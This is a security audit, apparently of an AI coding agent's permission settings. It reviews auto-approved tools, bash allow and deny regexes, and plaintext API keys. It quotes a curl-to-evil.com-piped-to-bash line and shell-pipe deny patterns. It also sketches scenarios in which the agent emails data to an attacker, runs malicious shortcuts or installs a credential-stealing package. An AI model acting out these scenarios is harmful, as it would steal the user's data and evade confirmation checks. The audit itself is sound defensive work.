# Permissions Security Audit

**Audit Date**: 2026-02-27
**Configuration File**: `~/.claude/settings.json`

## Executive Summary

Claude Code is configured with **aggressive auto-approval permissions** covering 44 tool patterns and 9 bash command patterns. While this maximizes productivity by eliminating confirmation prompts, it also creates **moderate security risks** around unintended file operations, API calls, and MCP tool execution. The current configuration strikes a reasonable balance for a trusted single-user system, but has opportunities for refinement.

**Security Score**: 🟡 **70%** (Good balance, some concerns)

## Auto-Approve Permissions Analysis

### Tool Auto-Approvals (44 patterns)

#### File System Tools (5)

```json
"Read", "Glob", "Grep", "Edit", "Write"
```

**Risk Level**: 🟡 Medium
**Rationale**:

- **Read/Glob/Grep**: ✅ Safe - read-only operations, no system modification
- **Edit**: 🟡 Moderate - can modify existing files, but requires file already read
- **Write**: 🔴 High - can create/overwrite any file without confirmation

**Security Concerns**:

1. **Write tool unrestricted** - Could accidentally overwrite critical files
2. **No path restrictions** - Can write to any location (including system dirs)
3. **No file type restrictions** - Could create executables, scripts, configs

**Recommendations**:

- Consider removing `Write` from auto-approve for dotfiles (`.env`, `.ssh/*`, etc.)
- Add path-based restrictions: require confirmation for writes to `~/.openclaw/`, `/etc/`, `/usr/`, etc.
- Add confirmation for overwriting existing files over certain size (e.g., >100KB)

#### Notebook Tools (1)

```json
"NotebookEdit"
```

**Risk Level**: 🟢 Low
**Rationale**: Jupyter notebook editing is specialized, low risk for PAIOS use case

#### Web Tools (2)

```json
"WebFetch", "WebSearch"
```

**Risk Level**: 🟢 Low
**Rationale**: Read-only web operations, no system modification
**Note**: WebFetch could be used for data exfiltration, but this is a trusted system

#### Task Management (6)

```json
"Task", "TaskCreate", "TaskUpdate", "TaskList", "TaskGet", "TaskOutput", "TaskStop"
```

**Risk Level**: 🟢 Low
**Rationale**: Task/team management is internal to Claude Code, no system-level risk

#### Team Management (2)

```json
"TeamCreate", "TeamDelete", "SendMessage"
```

**Risk Level**: 🟡 Medium
**Rationale**:

- **TeamCreate**: ✅ Safe - creates team metadata
- **TeamDelete**: 🟡 Moderate - can delete team data without confirmation
- **SendMessage**: ✅ Safe - internal messaging only

**Security Concerns**:

- TeamDelete could accidentally remove team context
- Recommendation: Require confirmation for TeamDelete

#### MCP Resource Tools (2)

```json
"ListMcpResourcesTool", "ReadMcpResourceTool"
```

**Risk Level**: 🟢 Low
**Rationale**: Read-only MCP resource access

#### MCP Server Wildcards (5 patterns)

```json
"mcp__knowledge-base__*",
"mcp__observability__*",
"mcp__macos-system__*",
"mcp__google-workspace__*",
"mcp__codex-cli__*"
```

**Risk Level**: 🟡 Medium to High (varies by server)

**Detailed Analysis**:

##### knowledge-base (🟢 Low Risk)

All 10 tools are read/query operations:

- `kb_query`, `kb_article`, `kb_stats`, `kb_recent` - ✅ Read-only
- `kb_entities`, `kb_graph`, `kb_decisions`, `kb_playbooks` - ✅ Read-only
- `kb_contradictions`, `kb_communities` - ✅ Read-only
  **Verdict**: Safe to auto-approve all

##### observability (🟡 Medium Risk)

9 read operations, 1 write operation:

- `obs_query`, `obs_stats`, `obs_llm_usage` - ✅ Read-only
- `obs_score` - ✅ Safe write (quality scoring)
- `obs_emit` - 🟡 **WRITE OPERATION** - creates observability events
- `router_*` - ✅ Safe (classification, queries, handoffs)

**Concern**: `obs_emit` can inject arbitrary events into observability DB
**Recommendation**: Consider requiring confirmation for `obs_emit` (or at least log usage)

##### macos-system (🔴 High Risk)

Mix of read and system-modifying operations:

- `macos_system_status`, `macos_read_clipboard`, `macos_list_apps` - ✅ Read-only
- `macos_write_clipboard` - 🟡 Moderate - overwrites clipboard
- `macos_send_notification` - 🟢 Low - user notifications
- `macos_calendar_events` - ✅ Read-only
- `macos_create_reminder` - 🟡 Moderate - creates system reminders
- `macos_open_url` - 🔴 **HIGH RISK** - can open arbitrary URLs
- `macos_open_file` - 🔴 **HIGH RISK** - can open/execute files
- `macos_run_shortcut` - 🔴 **VERY HIGH RISK** - executes Siri Shortcuts

**Security Concerns**:

1. **macos_open_url**: Could open malicious URLs, trigger browser exploits
2. **macos_open_file**: Could execute malicious scripts, apps
3. **macos_run_shortcut**: Shortcuts can perform arbitrary system actions (delete files, send messages, access data)

**Recommendations**:

- **CRITICAL**: Remove `macos_run_shortcut` from auto-approve (too powerful)
- Remove `macos_open_url` and `macos_open_file` from auto-approve
- Keep read operations and low-risk writes (clipboard, notifications, reminders)

##### google-workspace (🟡 Medium-High Risk)

17+ tools with mix of read and write operations:

- **Read operations** (✅ Safe):
  - `list_calendars`, `get_events`, `get_doc_content`, `get_drive_file_content`
  - `search_*`, `list_*`, `get_*` tools
- **Write operations** (🟡-🔴 Moderate to High Risk):
  - `create_event`, `modify_event` - 🟡 Calendar modifications
  - `create_doc`, `modify_doc_text` - 🟡 Document creation/editing
  - `send_gmail_message` - 🔴 **HIGH RISK** - sends emails from user account
  - `share_drive_file` - 🟡 File sharing (could leak sensitive data)
  - `run_script_function` - 🔴 **VERY HIGH RISK** - executes arbitrary Apps Script

**Security Concerns**:

1. **send_gmail_message**: Could send emails without user knowledge (phishing, spam, leaks)
2. **run_script_function**: Apps Scripts can access all Google Workspace data, make API calls
3. **share_drive_file**: Could accidentally expose confidential documents

**Recommendations**:

- **CRITICAL**: Remove `send_gmail_message` and `run_script_function` from auto-approve
- Require confirmation for all `share_*` and `modify_*` operations
- Keep read operations and safe writes (create docs/events for self)

##### codex-cli (⚪ Unknown Risk)

2 tools: `codex`, `codex-reply`
**Status**: Currently broken (OAuth expired)
**Risk Level**: 🟡 Medium - Code generation/execution
**Recommendation**: Require confirmation when operational

#### Planning Tools (3)

```json
"Skill", "EnterPlanMode", "ExitPlanMode"
```

**Risk Level**: 🟢 Low
**Rationale**: Meta-operations for Claude Code workflow, no system risk

#### User Interaction (1)

```json
"AskUserQuestion"
```

**Risk Level**: 🟢 Low
**Rationale**: Prompts user for input, no autonomous action

### Bash Auto-Approvals (9 patterns)

#### 1. Basic Unix Commands

```regex
^(ls|cat|head|tail|grep|find|wc|echo|pwd|which|whereis|whoami)\\b
```

**Risk Level**: 🟢 Low
**Rationale**: Read-only operations, standard Unix tools
**Note**: `find` with `-exec` could be dangerous, but pattern doesn't allow it

#### 2. Git Read Operations

```regex
^git (status|log|diff|show|branch|remote|config --get)
```

**Risk Level**: 🟢 Low
**Rationale**: Read-only Git operations, no repository modification
**Good Design**: Excludes `git add`, `git commit`, `git push` (require confirmation)

#### 3. Package Managers

```regex
^(pnpm|npm|bun|node|python|uv) (?!.*uninstall)
```

**Risk Level**: 🟡 Medium
**Rationale**: Allows package installs but blocks uninstalls
**Security Concerns**:

- `pnpm install malicious-package` - Could install malware
- `npm install` - Could run postinstall scripts (arbitrary code execution)
- Negative lookahead `(?!.*uninstall)` is good, but incomplete

**Recommendations**:

- Tighten pattern to read-only operations: `pnpm list`, `npm list`, `node --version`
- Require confirmation for `pnpm install`, `npm install` (or at least log package names)
- Consider allowing `pnpm install` only for existing package.json dependencies

#### 4. SQLite Read Queries

```regex
^sqlite3 .* \"SELECT
```

**Risk Level**: 🟢 Low
**Rationale**: Read-only SQL queries, no database modification
**Good Design**: Blocks INSERT, UPDATE, DELETE, DROP

#### 5. File Operations

```regex
^(mkdir|touch|cp|mv) (?!.*\\.\\.)
```

**Risk Level**: 🟡 Medium
**Rationale**: Allows file/directory creation and movement, blocks `..` (parent directory traversal)
**Security Concerns**:

- No destination restrictions - could `mv` files to sensitive locations
- `cp -r` could duplicate large directories
- Pattern doesn't prevent overwriting existing files

**Recommendations**:

- Add confirmation for operations affecting dotfiles: `mv .* ~/.openclaw/`
- Add confirmation for `cp -r` (recursive copies)
- Consider restricting to current working directory only

#### 6. Curl Read Operations

```regex
^curl -s
```

**Risk Level**: 🟢 Low
**Rationale**: Silent curl (no progress bar), typically for API queries
**Note**: Doesn't block `curl -s http://evil.com | bash` - but that's caught by require-confirmation pattern

#### 7. JSON Processing

```regex
^jq
```

**Risk Level**: 🟢 Low
**Rationale**: JSON parsing/filtering tool, read-only

#### 8. Process Queries

```regex
^(pgrep|ps aux)
```

**Risk Level**: 🟢 Low
**Rationale**: Read-only process information

#### 9. Launchd Queries

```regex
^launchctl (list|print)
```

**Risk Level**: 🟢 Low
**Rationale**: Read-only launchd queries
**Good Design**: Blocks `launchctl start`, `launchctl stop`, `launchctl load` (require confirmation)

## Require-Confirmation Patterns (7 patterns)

### 1. Destructive File Operations

```regex
\\brm\\b.*(-rf|-fr|--recursive)
```

**Coverage**: ✅ Excellent
**Protects Against**: Accidental directory deletion
**Note**: Catches `rm -rf`, `rm -fr`, but not `rm file1 file2 ...` (single file deletion is still auto-approved)

### 2. Destructive Git Operations

```regex
\\bgit\\b.*(push.*--force|reset.*--hard|clean -f|branch -D)
```

**Coverage**: ✅ Excellent
**Protects Against**: Force pushes, hard resets, branch deletion, working directory cleaning
**Aligns with**: CLAUDE.md Git Safety Protocol

### 3. Privileged Operations

```regex
\\b(sudo|doas)\\b
```

**Coverage**: ✅ Excellent
**Protects Against**: Accidental superuser commands

### 4. Process Killing

```regex
\\bkill\\b.*-9
```

**Coverage**: 🟡 Good but incomplete
**Protects Against**: Force-kill signals (SIGKILL)
**Gap**: Doesn't block `kill -15` (SIGTERM), `killall`, `pkill -9`
**Recommendation**: Expand to `\\b(kill|killall|pkill)\\b.*-9`

### 5. Database Deletion

```regex
\\bdropdb\\b
```

**Coverage**: ✅ Good for PostgreSQL
**Gap**: Doesn't protect SQLite (`rm *.sqlite`, `sqlite3 db.sqlite "DROP TABLE"`)
**Recommendation**: Add `sqlite3.*\"(DROP|DELETE|TRUNCATE)` pattern

### 6. Table Truncation

```regex
\\btruncate\\b
```

**Coverage**: ✅ Excellent
**Protects Against**: SQL TRUNCATE operations (via sqlite3 or psql)

### 7. Redirect/Pipe Dangers

```regex
>(>|&)
\\|\\s*sh\\b
\\bcurl\\b.*\\|.*\\b(bash|sh)\\b
```

**Coverage**: ✅ Excellent
**Protects Against**:

- Redirect overwriting (`>>` or `>&`)
- Piping to shell (`| sh`, `| bash`)
- Curl pipe to shell (`curl ... | bash`)

## Security Vulnerabilities

### Critical Issues (Immediate Action Required)

#### 1. Unrestricted System Shortcuts (Priority: 🔴 Critical)

**Vulnerability**: `macos_run_shortcut` auto-approved
**Impact**: Siri Shortcuts can perform ANY system action without confirmation:

- Delete files, send messages, access contacts, post to social media
- Execute arbitrary AppleScript/JavaScript/shell scripts
- Access camera, microphone, location

**Exploit Scenario**:

```
Claude: "Let me optimize your system by running the cleanup shortcut"
[Executes malicious shortcut that deletes user data]
```

**Remediation**: Remove `macos_run_shortcut` from auto-approve immediately

#### 2. Unrestricted Gmail Sending (Priority: 🔴 Critical)

**Vulnerability**: `mcp__google-workspace__send_gmail_message` auto-approved
**Impact**: Could send emails from user account without confirmation

- Phishing attacks, spam, data exfiltration
- Send confidential data to external addresses
- Reputational damage if account used for spam

**Exploit Scenario**:

```
Claude: "I'll send you a summary of your KB by email"
[Sends KB dump to attacker-controlled email address]
```

**Remediation**: Remove `send_gmail_message` from auto-approve immediately

#### 3. Apps Script Execution (Priority: 🔴 Critical)

**Vulnerability**: `mcp__google-workspace__run_script_function` auto-approved
**Impact**: Apps Scripts have full Google Workspace access:

- Read/modify all Gmail, Drive, Calendar, Contacts data
- Send emails, share files, create/delete documents
- Make external API calls, exfiltrate data

**Exploit Scenario**:

```
Claude: "Let me analyze your calendar patterns using an Apps Script"
[Executes script that emails calendar data to attacker]
```

**Remediation**: Remove `run_script_function` from auto-approve immediately

### High-Risk Issues (Address This Week)

#### 4. Unrestricted File/URL Opening (Priority: 🔴 High)

**Vulnerability**: `macos_open_url`, `macos_open_file` auto-approved
**Impact**: Could open malicious URLs or execute files

- Phishing sites, malware downloads, browser exploits
- Execute shell scripts, apps without user knowledge

**Exploit Scenario**:

```
Claude: "Let me show you the documentation"
[Opens http://evil.com/phishing-page instead of legitimate docs]
```

**Remediation**: Remove both from auto-approve, require confirmation

#### 5. Unrestricted Package Installation (Priority: 🔴 High)

**Vulnerability**: `pnpm install`, `npm install` auto-approved
**Impact**: Could install malicious packages with postinstall scripts

- Arbitrary code execution via npm lifecycle scripts
- Supply chain attacks, credential theft

**Exploit Scenario**:

```
Claude: "I'll install a helper package"
[Runs: pnpm add evil-package]
[evil-package postinstall script exfiltrates ~/.openclaw/ credentials]
```

**Remediation**: Require confirmation for install commands, or restrict to read-only operations

### Medium-Risk Issues (Address This Month)

#### 6. Unrestricted Write Tool (Priority: 🟡 Medium)

**Vulnerability**: `Write` tool auto-approved for all paths
**Impact**: Could overwrite critical files

- Overwrite `.env`, `auth-profiles.json`, other configs
- Create executables in PATH directories
- Fill disk with large files

**Mitigation**: Add path-based restrictions for sensitive locations

#### 7. Observability Event Injection (Priority: 🟡 Medium)

**Vulnerability**: `obs_emit` auto-approved
**Impact**: Could poison observability data

- Inject false events, manipulate metrics
- Hide malicious actions by not emitting events
- Create noise to obscure real issues

**Mitigation**: Require confirmation or add audit logging

#### 8. Team Deletion Without Confirmation (Priority: 🟡 Medium)

**Vulnerability**: `TeamDelete` auto-approved
**Impact**: Could accidentally delete team context and tasks

**Mitigation**: Require confirmation for TeamDelete

## API Key Exposure Analysis

### Critical Security Issue: Plaintext API Keys in Config

```json
"env": {
  "BRAVE_API_KEY": "REDACTED_BRAVE_API_KEY",
  "ELEVENLABS_API_KEY": "REDACTED_ELEVENLABS_API_KEY",
  "DEEPGRAM_API_KEY": "REDACTED_DEEPGRAM_API_KEY",
  "LATE_API_KEY": "REDACTED_LATE_API_KEY",
  "OPENROUTER_API_KEY": "REDACTED_OPENROUTER_API_KEY",
  "OPENAI_API_KEY": "REDACTED_OPENAI_API_KEY"
}
```

**Vulnerability**: API keys stored in plaintext in `settings.json`
**Impact**: 🔴 **CRITICAL**

- Keys visible in backups, version control (if accidentally committed)
- Accessible to any process that can read `~/.claude/settings.json`
- Claude Code sessions could read and exfiltrate keys

**Affected Services**:

- Brave Search ($6/month value)
- ElevenLabs (voice synthesis, usage-based billing)
- Deepgram (speech-to-text, usage-based billing)
- Late.dev (productivity tool)
- OpenRouter (LLM proxy, usage-based billing)
- OpenAI (GPT access, usage-based billing)

**Risk Assessment**:

- **Financial Impact**: Moderate (could rack up charges on usage-based APIs)
- **Data Impact**: Low (keys don't provide access to user data, only API services)
- **Reputational Impact**: Low (single-user system, no shared access)

**Remediation Options**:

1. **Best Practice**: Move keys to `auth-profiles.json` (already contains Anthropic, Google, etc.)
   - Centralized key management
   - Already used by gateway and scripts
   - Aligns with PAIOS architecture

2. **Alternative**: Use macOS Keychain
   - More secure, encrypted storage
   - Requires keychain integration in Claude Code
   - May not be supported

3. **Alternative**: Environment variables only
   - Keys in `~/.zshrc` or system profile
   - Not passed to Claude Code config
   - Gateway already uses this pattern

**Recommendation**: Migrate keys to `auth-profiles.json` and reference from env

```json
"env": {
  "BRAVE_API_KEY": "${BRAVE_API_KEY}"
}
```

Load keys in shell profile:

```bash
# ~/.zshrc
export BRAVE_API_KEY=$(jq -r '.brave.key' ~/.openclaw/auth-profiles.json)
```

## Recommendations Summary

### Immediate Actions (Today)

1. **Remove critical auto-approvals**:
   - `macos_run_shortcut` (system shortcuts)
   - `send_gmail_message` (email sending)
   - `run_script_function` (Apps Script execution)
   - `macos_open_url`, `macos_open_file` (arbitrary URL/file opening)

2. **Migrate API keys** from `settings.json` to `auth-profiles.json`

### Short-Term (This Week)

1. **Tighten package manager pattern**:
   - Change from: `^(pnpm|npm|bun|node|python|uv) (?!.*uninstall)`
   - To: `^(pnpm|npm|bun) (list|ls|outdated|why|audit)` (read-only only)
   - Add confirmation for: `^(pnpm|npm) (install|add|remove|uninstall)`

2. **Add path restrictions for Write tool**:
   - Require confirmation for: `~/.openclaw/auth-profiles.json`, `~/.openclaw/credentials/`, `~/.ssh/`, `.env` files

3. **Expand kill command protection**:
   - Change from: `\\bkill\\b.*-9`
   - To: `\\b(kill|killall|pkill)\\b.*-9`

### Medium-Term (This Month)

1. **Add SQLite write protection**:
   - Add require-confirmation: `sqlite3.*\"(DROP|DELETE|TRUNCATE|UPDATE|INSERT)`
   - Exception: Allow auto-approve for observability.sqlite writes (low risk)

2. **Add audit logging for sensitive operations**:
   - Log all MCP tool calls to observability DB
   - Log all Write operations to sensitive paths
   - Log all package installs

3. **Create separate auto-approve rules by context**:
   - Development context: Allow more file operations
   - Production context: Require more confirmations
   - Audit context: Read-only operations only

### Long-Term (This Quarter)

1. **Implement role-based permissions**:
   - Read-only mode for exploration/audits
   - Dev mode for coding tasks
   - Admin mode for system operations

2. **Add per-tool usage tracking**:
   - Which tools are actually used vs. auto-approved?
   - Could tighten permissions based on actual usage patterns

3. **Implement key rotation**:
   - Regularly rotate API keys
   - Monitor for leaked keys in git history, logs

## Comparison with Best Practices

### Industry Standards: Principle of Least Privilege

**PAIOS Score**: 🟡 60%

- Good: Requires confirmation for destructive operations (rm -rf, git push --force, sudo)
- Gap: Too many write operations auto-approved (Write tool, google-workspace, macos-system)
- Gap: Package installation auto-approved (npm/pnpm install)

### GitHub Actions Permissions Model

GitHub Actions uses explicit permissions per workflow:

```yaml
permissions:
  contents: read
  issues: write
  pull-requests: write
```

**PAIOS Equivalent**: Could implement per-session or per-task permission scopes
Example: "Audit session" gets read-only permissions, "Development session" gets write permissions

### AWS IAM Policy Structure

AWS uses deny-by-default with explicit allow rules
**PAIOS Current**: Allow-by-default with explicit deny patterns (opposite!)

**Improvement Opportunity**: Flip model to require-confirmation by default, with explicit auto-approve whitelist

## Testing Recommendations

### Penetration Testing Scenarios

1. **Social Engineering**: Ask Claude to "optimize system" and see if it executes dangerous shortcuts
2. **Data Exfiltration**: Ask Claude to "email me a summary" and verify confirmation required
3. **Malicious Package**: Create fake package and see if Claude would install it
4. **Config Overwrite**: Ask Claude to "improve" a config file and verify Write restrictions

### Audit Logging

Enable comprehensive logging for:

- All auto-approved operations (timestamp, tool, args)
- All confirmation prompts (user approved or denied)
- All permission violations (tool blocked, reason)

Store logs in: `~/.openclaw/observability.sqlite` (already has audit infrastructure)

## Conclusion

The current permissions configuration is **70% secure** with **3 critical vulnerabilities** and **2 high-risk issues** requiring immediate remediation. The configuration shows good security awareness (confirmation for destructive ops, git safety) but is too permissive for system-level operations (shortcuts, email, file opening) and external API access.

**Priority Actions**:

1. Remove 5 critical auto-approvals (shortcuts, gmail, apps script, open url/file)
2. Migrate API keys out of settings.json to auth-profiles.json
3. Tighten package manager permissions to read-only operations

**Estimated Time**: 1-2 hours to implement critical fixes

**Risk Reduction**: From 30% vulnerable to 10% vulnerable (70% improvement)

Once these changes are implemented, PAIOS will have a strong security posture balancing productivity with safety for a trusted single-user development environment.
